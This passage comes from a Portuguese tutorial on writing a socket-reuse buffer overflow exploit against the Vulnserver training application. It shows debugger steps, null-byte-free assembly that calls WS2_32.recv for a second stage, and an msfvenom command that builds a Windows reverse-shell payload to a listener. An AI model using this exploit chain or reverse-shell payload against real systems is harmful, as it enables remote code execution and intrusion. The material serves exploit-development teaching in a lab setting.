<p>Este processo nos mostrara a lista de todas as chamadas para outros módulos. Vamos clicar no cabeçalho na coluna 'Destination' para ordenar por nome. É importante notar que a ordenação ocorrerá por nome da função não por módulo. Por exemplo, WS2_32.bind e WS2_32.recv serão ordenadas nas palavras bind e recv respectivamente.</p>
<p>Após a ordenação podemos facilmente localizar a chamada para a recv, após localizado a selecione e pressione F2 para adicionar um breakpoint. Você verá que a instrução ficará marcada conforme a a imagem abaixo:</p>
<p><a href="http://www.helviojunior.com.br/wp-content/uploads/2019/02/08-2019-02-16_173008.png"><img class="alignnone size-full wp-image-1938" src="{{ site.baseurl }}/assets/2019/02/08-2019-02-16_173008.png" alt="" width="1120" height="969" /></a></p>
<p>Após adicionar o breakkpoint clique com o botão direito e clique em Follow in Disassembler</p>
<p><a href="http://www.helviojunior.com.br/wp-content/uploads/2019/02/08-2019-02-16_173213.png"><img class="alignnone size-full wp-image-1939" src="{{ site.baseurl }}/assets/2019/02/08-2019-02-16_173213.png" alt="" width="670" height="242" /></a></p>
<p>Indo para a chamada da função WS2_32.recv</p>
<p><a href="http://www.helviojunior.com.br/wp-content/uploads/2019/02/08-2019-02-17_142314.png"><img class="alignnone size-full wp-image-1940" src="{{ site.baseurl }}/assets/2019/02/08-2019-02-17_142314.png" alt="" width="1116" height="564" /></a></p>
<p>Para localizar o nosso file descritor do socket, vamos alterar nosso exploit substituindo os As do nosso buffer por 0xCC que é um breakpoint. Isso é ara simplificar nosso processo.</p>
<p><script src="https://gist-it.appspot.com/github/helviojunior/vulnserver/blob/master/exploit2_WS2_32_Recv/08-filedescriptor-find.py"></script></p>
<p>Quando executado o processo deverá parar no breakpoint do recv</p>
<p><a href="http://www.helviojunior.com.br/wp-content/uploads/2019/02/08-2019-02-17_142940.png"><img class="alignnone size-full wp-image-1942" src="{{ site.baseurl }}/assets/2019/02/08-2019-02-17_142940.png" alt="" width="1116" height="968" /></a></p>
<p>Neste ponto podemos observar nossa pilha (stack) os argumentos que estão sendo passados para a função recv. Que fazendo um paralelo com a documentação do MSDN temos os seguintes parâmetros:</p>
<p>[sourcecode language="python"]int recv(<br />
SOCKET 0x00000050,<br />
char   *0x002B3358,<br />
int    0x1000,<br />
int    0x00000000<br />
);<br />
[/sourcecode]</p>
<p>Então nosso<em> file descriptor</em> que tanto desejamos é 0x00000050. Vamos permitir a execução da nossa aplicação pressionando F9 (pode ser que precise reiniciar a aplicação e o immunity e retirar o breakpoint da função recv pois algumas vezes o sistema não permite dar continuidade na execução, se isso ocorrer reinicie o immunity e anexe novamente a aplicação e rode o exploit novamente).</p>
<p><strong>Nota de endereço</strong>: Neste ponto de pressionarmos mais uma vez o F7 iremos para a tela abaixo onde será apresentado o endereço da chamada da WS2_32.recv em nossa IAT (Import Address Table), anote este endereço pois utilizaremos bem mais a frente.</p>
<p><a href="http://www.helviojunior.com.br/wp-content/uploads/2019/02/08-2019-02-16_194102.png"><img class="alignnone size-full wp-image-1962" src="{{ site.baseurl }}/assets/2019/02/08-2019-02-16_194102.png" alt="" width="716" height="561" /></a></p>
<h3>0x09 - Encontrando o file descriptor</h3>
<p>Uma vez encontrado o valor do <em>file descriptor</em> agora precisamos encontrar onde o valor do mesmo está armazenado e qual a relação e distância na pilha ele está da nossa posição atual.</p>
<p>Com nosso exploit parado no primeiro 0xCC no painel esquero superior clique com o botão direito do mouse e clique em Search for &gt; Binary String</p>
<p><a href="http://www.helviojunior.com.br/wp-content/uploads/2019/02/09-2019-02-16_175126.png"><img class="alignnone size-full wp-image-1945" src="{{ site.baseurl }}/assets/2019/02/09-2019-02-16_175126.png" alt="" width="1116" height="966" /></a></p>
<p>Então procure pelo valor do file descriptor (em nosso caso 0x00000050)</p>
<p><a href="http://www.helviojunior.com.br/wp-content/uploads/2019/02/09-2019-02-16_175223.png"><img class="alignnone size-full wp-image-1946" src="{{ site.baseurl }}/assets/2019/02/09-2019-02-16_175223.png" alt="" width="1116" height="970" /></a></p>
<p>Quando fazemos isso, podemos buscar as outras opções pressionando CTRL + L. No nosso ambiente encontramos as seguintes opções</p>
<p><a href="http://www.helviojunior.com.br/wp-content/uploads/2019/02/09-2019-02-17_145246.png"><img class="alignnone size-full wp-image-1947" src="{{ site.baseurl }}/assets/2019/02/09-2019-02-17_145246.png" alt="" width="1116" height="969" /></a></p>
<p><a href="http://www.helviojunior.com.br/wp-content/uploads/2019/02/09-2019-02-17_145300.png"><img class="alignnone size-full wp-image-1948" src="{{ site.baseurl }}/assets/2019/02/09-2019-02-17_145300.png" alt="" width="1116" height="970" /></a></p>
<p>Escolhi a primeira opção</p>
<p>[sourcecode language="c"]00FAF8B1   0000             ADD BYTE PTR DS:[EAX],AL<br />
00FAF8B3   0050 00          ADD BYTE PTR DS:[EAX],DL<br />
00FAF8B6   0000             ADD BYTE PTR DS:[EAX],AL<br />
00FAF8B8   0000             ADD BYTE PTR DS:[EAX],AL<br />
00FAF8BA   0000             ADD BYTE PTR DS:[EAX],AL<br />
[/sourcecode]</p>
<p>Quando nós alcançamos a função recv pela primeira vez a pilha de memória estava na posição</p>
<p>[sourcecode language="c"]00FAF9F8<br />
[/sourcecode]</p>
<p>Baseado nessas informações podemos calcular a distancia entre a posição atual da pilha e o endereço atual</p>
<p>[sourcecode language="c"]0x00F7F9F8 (Endereço desejado) - 0x00F7F8B1 (ESP) = Hex: 0x0147 ou Decimal: 327<br />
[/sourcecode]</p>
<p>Sendo assim vamos começar a escrita do nosso segundo estágio do exploit</p>
<p>[sourcecode language="c"]PUSH ESP      ; Armazena a posição atual de ESP na pilha<br />
POP ECX       ; Retira o valor da pilha e o coloca em ECX<br />
SUB CX,0x147  ; Subtrai 0x147 de ECX<br />
[/sourcecode]</p>
<p>Usando o msf-nasm_shell para nos ajudar nessa tarefa</p>
<p>[sourcecode language="c"]root@M4v3r1cK:~# msf-nasm_shell<br />
nasm &amp;amp;gt; push esp<br />
00000000  54                push esp<br />
nasm &amp;amp;gt; pop ecx<br />
00000000  59                pop ecx<br />
nasm &amp;amp;gt; sub cx,0x147<br />
00000000  6681E94701        sub cx,0x147<br />
nasm &amp;amp;gt;<br />
[/sourcecode]</p>
<p>O exploit ficou assim:</p>
<p><script src="https://gist-it.appspot.com/github/helviojunior/vulnserver/blob/master/exploit2_WS2_32_Recv/09-stage2.py"></script></p>
<p>Ao executa-lo temos o ECX apontando exatamente para a posição de memória que contém o endereço do <em>file descriptor</em>:</p>
<p><a href="http://www.helviojunior.com.br/wp-content/uploads/2019/02/09-2019-02-16_183848.png"><img class="alignnone size-full wp-image-1950" src="{{ site.baseurl }}/assets/2019/02/09-2019-02-16_183848.png" alt="" width="1116" height="969" /></a></p>
<p>Em um mundo perfeito isso estaria certo, mas como logo a frente iremos resgatar este valor usando a chamada <strong>PUSH DWORD PTR DS:[ECX]</strong>, vamos executa-la agora apenas para ver o que acontece.</p>
<p><a href="http://www.helviojunior.com.br/wp-content/uploads/2019/02/09-2019-02-17_154657.png"><img class="alignnone size-full wp-image-1953" src="{{ site.baseurl }}/assets/2019/02/09-2019-02-17_154657.png" alt="" width="1116" height="967" /></a></p>
<p>Podemos ver que o valor inserido na pilha foi <strong>0x50000000</strong> e não <strong>0x00000050</strong> como o esperado, isso ocorre devido ao endianess, sendo assim precisamos alterar nosso exploit para subtrair 3 bytes a menos sendo 0x144 ao invés de 0x147, ficando assim:</p>
<p><script src="https://gist-it.appspot.com/github/helviojunior/vulnserver/blob/master/exploit2_WS2_32_Recv/09-stage2-correct.py"></script></p>
<p><a href="http://www.helviojunior.com.br/wp-content/uploads/2019/02/09-2019-02-17_155316.png"><img class="alignnone size-full wp-image-1954" src="{{ site.baseurl }}/assets/2019/02/09-2019-02-17_155316.png" alt="" width="1116" height="969" /></a></p>
<h3>0x0a - Chamando WS2_32.recv</h3>
<p>Com nosso file descriptor podemos calcular/montar os outros 3 parametros necessários para a chamada da função WS2_32.recv.</p>
<p>Retomando como deve ser a chamada da função, como visto anteriormente, os valores devem ser similares a estes (segund p padrão da documentação do MSDN):</p>
<p>[sourcecode language="c"]int recv(<br />
SOCKET 0x00000050,<br />
char   *0x002B3358,<br />
int    0x1000,<br />
int    0x00000000<br />
);<br />
[/sourcecode]</p>
<p>Conforme visto e certificado na imagem abaixo:</p>
<p><a href="http://www.helviojunior.com.br/wp-content/uploads/2019/02/08-2019-02-17_142940.png"><img class="alignnone size-full wp-image-1942" src="{{ site.baseurl }}/assets/2019/02/08-2019-02-17_142940.png" alt="" width="1116" height="968" /></a></p>
<p>Como colocaremos os valores diretamente na pilha devemos lembrar que o empilhamento deve ocorrer de forma inversa (caso tenha dúvidas deste funcionamento veja nosso post <a href="https://www.helviojunior.com.br/it/security/criacao-de-exploits/criacao-de-exploits-parte-0-um-pouco-de-teoria/" target="_blank" rel="noopener noreferrer">Criação de Exploits – Parte 0 – Um pouco de teoria</a> onde explico o funcionamento da pilha e outas coisas mais), sendo assim o primeiro item a ser empilhado é o quarto parâmetro (flags), para posteriormente o tamanho do buffer, a localização da memória a ser utilizada como buffer e por fim o file descriptor (valor este qe ja temos armazenado em ECX)</p>
<p>Outro ponto importante que devemos observar é que conforme realizamos um empilhamento, ou seja PUSH, o endereço da pilha vai subtraindo e conforme observado na imagem abaixo o endereço da nossa pilha está localizado ligeiramente abaixo do nosso buffer, isso faz com que cada valor que vamos colocar na pilha reduz mais o nosso restruto espaço de 66 bytes, sendo assim nossa primeira preoocupação antes de colocar os valores na pilha é alterar a posição da pilha para contornar este problema.</p>
<p><a href="http://www.helviojunior.com.br/wp-content/uploads/2019/02/10-2019-02-17_155941.png"><img class="alignnone size-full wp-image-1956" src="{{ site.baseurl }}/assets/2019/02/10-2019-02-17_155941.png" alt="" width="1116" height="969" /></a></p>
<p>Então nada que jogar a pilha para 80 bytes a menos não resolva</p>
<p>[sourcecode language="c"]SUB ESP, 0X50<br />
[/sourcecode]</p>
<p>Vamos agora tratar o primeiro parametro a ser empilhado (4 argumento da função recv) que é a flag que necessita ter valor 0x00 como 0x00 é um null byte e não podemos usar em nosso exploit vamos usar a técnica do XOR:</p>
<p>[sourcecode language="c"]XOR EAX,EAX   ; Zera eax<br />
PUSH EAX      ; Coloca EAX na pilha<br />
[/sourcecode]</p>
<p>O segundo valor a ser empilhado (3 argumento da função recv) é o tamanho do buffer, que em nosso caso escolhi 520 (hexa 0x0208) em virtude de uma questão estratégica de não usar o null byte neste processo. Nesta atribuição iremos usar alguns recursos do assembly que nos permite atribuir diretamente algumas partes do nosso registrador, para facilitar o entendimento de uma olhada na imagem abaixo:</p>
<p><a href="http://www.helviojunior.com.br/wp-content/uploads/2019/02/10-registradores.png"><img class="alignnone size-full wp-image-1957" src="{{ site.baseurl }}/assets/2019/02/10-registradores.png" alt="" width="1009" height="711" /></a></p>
<p>Representado com os valores que desejamos abaixo:</p>
<p>[sourcecode language="c"]+----------------------+<br />
|        |    EAX      |<br />
|32 bits | 00 00 02 08 |<br />
+--------|-------------+<br />
|        |        AX   |<br />
|16 bits |       02 08 |<br />
+--------|-------------+<br />
|        |       AH AL |<br />
|8 bits  |       02 08 |<br />
+----------------------+<br />
[/sourcecode]</p>
<p>Sendo assim podemos atribuir da seguinte forma:</p>
<p>[sourcecode language="c"]XOR EAX,EAX   ; Zera eax<br />
MOV AL,0x08   ; Coloca 0x08 em AL<br />
MOV AH,0x02   ; Coloca 0x02 em AH<br />
PUSH EAX      ; Coloca EAX na pilha<br />
[/sourcecode]</p>
<p>Agora vamos para o terceiro valor a ser empilhado (segundo parâmetro da função recv) que é o endereço de memória onde deve-se gravar o que for recebido pelo socket do cliente. Como sabemos que nosso ESP foi deslocado 80 bytes e que antes do deslocamento ele estava ligeiramente abaixo do nosso restrito espaço de 66 bytes vamos usar o mesmo parâmetro de calculo para estimar a posição onde deve ser gravado os dados lidos pelo socket:</p>
<p>[sourcecode language="c"]PUSH ESP      ; Armazena a posição atual de ESP na pilha<br />
POP EDX       ; Retira o valor da pilha e o coloca em EDX<br />
ADD EDX, 50   ; Adiciona 80 bytes (hexa 0x50) ao registrador EDX<br />
PUSH EDX      ; Coloca EDX na pilha<br />
[/sourcecode]</p>
<p>Por fim vamos colocar na pilha o valor do nosso file descriptor (enteriormente calculado)</p>
<p>[sourcecode language="c"]PUSH DWORD PTR DS:[ECX]      ; Coloca na pilha o valor que existe no endereço de memória do ECX<br />
[/sourcecode]</p>
<p>No final deste processo temos o código abaixo:<br />
<script src="https://gist-it.appspot.com/github/helviojunior/vulnserver/blob/master/exploit2_WS2_32_Recv/10-arguments.py"></script></p>
<p>E ao executa-lo o seguinte resultado:</p>
<p><a href="http://www.helviojunior.com.br/wp-content/uploads/2019/02/10-2019-02-17_163218.png"><img class="alignnone size-full wp-image-1960" src="{{ site.baseurl }}/assets/2019/02/10-2019-02-17_163218.png" alt="" width="1116" height="967" /></a></p>
<p>Fazendo nosso paralelo com a documentação MSDN temos os valores abaixo, lembrando que o endereço de memória é dinâmico, então se altera a cada execução</p>
<p>[sourcecode language="c"]int recv(<br />
SOCKET 0x00000050,<br />
char   *0x00FEF9F0,<br />
int    0x00000208,<br />
int    0x00000000<br />
);<br />
[/sourcecode]</p>
<p>Agora temos todos os parâmetros necessários para chamar a função WS2_32.recv, existem diversos métodos para chamar a função, utilizaremos um deles e ao meu ver o mais seguro deles.</p>
<p>Mas antes disso precisamos saber qual é o endereço, creio que você se lembre daquele endereço que colocamos o breakpoint e eu falei p/ anotar que usariamos mais a frente? Não? Nessas alturas do campeonato, com tanta coisa eu também não lembraria, nós falamos dele no ítem 0x08, mas para facilitar o trabalho segue ele abaixo:</p>
<p>[sourcecode language="c"]0x0040252c<br />
[/sourcecode]</p>
<p>Para coloca-lo na pilha vamos adiciona-lo em EAX e depois fazer um CALL EAX, mas ai temos um desafio, o endereço começa com ox00 que é um null byte, então o que fazemos? Sempre temos alguma carta na manga. Neste caso vamos colocar o valor deslocado 8 bits para a esquerda, e depois fazer o deslocamente para a direita. Simples né?</p>
<p>Não, então vamos entender, supondo que tenhamos o valor abaixo:</p>
<p>[sourcecode language="c"]+----------------------+<br />
|        |    EAX      |<br />
|32 bits | 40 25 2c 11 |<br />
+--------|-------------+<br />
[/sourcecode]</p>
<p>Ao realizar o deslocamento dele 8 bits para a direita ele passará a ter o seguinte valor:</p>
<p>[sourcecode language="c"]+----------------------+<br />
|        |    EAX      |<br />
|32 bits | 00 40 25 2c |<br />
+--------|-------------+<br />
[/sourcecode]</p>
<p>Que é exatamente o que queremos, e para fazer isso em asembly usamos a instrução shr ficando assim:</p>
<p>[sourcecode language="c"]MOV EAX,0x40252c11  ; Atribui o valor 0x40252c11 em EAX<br />
SHR EAX,BYTE 0x8    ; Faz o deslocamento de 8 bits para a direita<br />
[/sourcecode]</p>
<p>E por fim fazemos o call de EAX</p>
<p>[sourcecode language="c"]CALL EAX<br />
[/sourcecode]</p>
<p>Antes de executar nosso exploit para o teste necessitamos criar 520 bytes para ser o shellcode bem como fazer o envio dele pelo socket ficando então nosso código como o abaixo:</p>
<p><script src="https://gist-it.appspot.com/github/helviojunior/vulnserver/blob/master/exploit2_WS2_32_Recv/10-callingrecv.py"></script></p>
<p>Ao executa-lo temos o seguinte cenário:</p>
<p>Antes da chamada do CALL EAX</p>
<p><a href="http://www.helviojunior.com.br/wp-content/uploads/2019/02/07-2019-02-17_131457.png"><img class="alignnone size-full wp-image-1925" src="{{ site.baseurl }}/assets/2019/02/07-2019-02-17_131457.png" alt="" width="1116" height="664" /></a></p>
<p>Mais uma vez fazendo o paralelo com a documentação do MSDN temos os seguintes valores:</p>
<p>[sourcecode language="c"]int recv(<br />
SOCKET 0x00000050,<br />
char   *0x00FEF9F0,<br />
int    0x00000208,<br />
int    0x00000000<br />
);<br />
[/sourcecode]</p>
<p>Note que o endereço de memória 00FEF9F0 tem alguns NOPs seguido de outros códigos que logo depois da chamada do CALL EAX são inteiramente substituidos pelo nosso pseudo shellcode (0x45)</p>
<p><a href="http://www.helviojunior.com.br/wp-content/uploads/2019/02/07-2019-02-17_131525.png"><img class="alignnone size-full wp-image-1926" src="{{ site.baseurl }}/assets/2019/02/07-2019-02-17_131525.png" alt="" width="1116" height="546" /></a></p>
<p>&nbsp;</p>
<h3>0x0b - Aproveite o shell</h3>
<p>Com tudo pronto basta alterar a variável do shellcode dentro do nosso exploit pelos shellcode desejado e seja feliz</p>
<p>[sourcecode language="shell"]msfvenom -p windows/shell_reverse_tcp lhost=192.168.15.177 lport=4444 -a x86 --platform win -b &quot;\x00&quot; -f python<br />
[/sourcecode]</p>
<p><a href="http://www.helviojunior.com.br/wp-content/uploads/2019/02/11-2019-02-16_222310.png"><img class="alignnone size-full wp-image-1966" src="{{ site.baseurl }}/assets/2019/02/11-2019-02-16_222310.png" alt="" width="1009" height="567" /></a></p>
<p><script src="https://gist-it.appspot.com/github/helviojunior/vulnserver/blob/master/exploit2_WS2_32_Recv/11-final.py"></script></p>
<p><a href="http://www.helviojunior.com.br/wp-content/uploads/2019/02/11-2019-02-16_222422.png"><img class="alignnone size-full wp-image-1967" src="{{ site.baseurl }}/assets/2019/02/11-2019-02-16_222422.png" alt="" width="1116" height="994" /></a></p>
<p><a href="http://www.helviojunior.com.br/wp-content/uploads/2019/02/10-2019-02-17_075237.png"><img class="alignnone size-full wp-image-1968" src="{{ site.baseurl }}/assets/2019/02/10-2019-02-17_075237.png" alt="" width="578" height="307" /></a></p>
